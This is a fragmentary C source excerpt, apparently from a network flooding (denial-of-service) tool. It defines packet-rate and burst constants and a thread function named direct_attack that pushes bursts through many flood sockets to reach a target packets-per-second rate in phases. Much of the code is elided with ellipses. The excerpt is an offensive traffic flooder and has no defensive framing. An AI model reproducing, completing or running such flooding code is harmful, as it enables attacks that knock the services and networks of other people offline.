...
#define PPS_20BYTE 3800
#define PPS_128BYTE 950
#define STABLE_BURST 650
...
#define PORT_CHANGE_NORMAL 3000
#define PORT_CHANGE_DIRECT 10000
...
void *direct_attack(void *arg) {
    ...
    while (!atomic_load(&stop_signal)) {
        ...
        if (current_phase == 1) target_pps = (base_pps * PHASE1_POWER) / 100;
        else target_pps = (base_pps * PHASE3_POWER) / 100;
        ...
        while (packets_this_sec < target_pps && !atomic_load(&stop_signal)) {
            for (int i = 0; i < FLOOD_SOCKETS; i++) {
                ...
                for (int burst = 0; burst < STABLE_BURST; burst++) {
                    ...
                    if (ret > 0) {
                        ...
                        if (packets_this_sec >= target_pps) break;
                    }
                }
                if (packets_this_sec >= target_pps) break;
            }
            ...
            gettimeofday(&cycle_end, NULL);
            elapsed_us = (cycle_end.tv_sec - cycle_start.tv_sec) * 1000000 + 
                        (cycle_end.tv_usec - cycle_start.tv_usec);
            if (elapsed_us >= 1000000) break;
        }
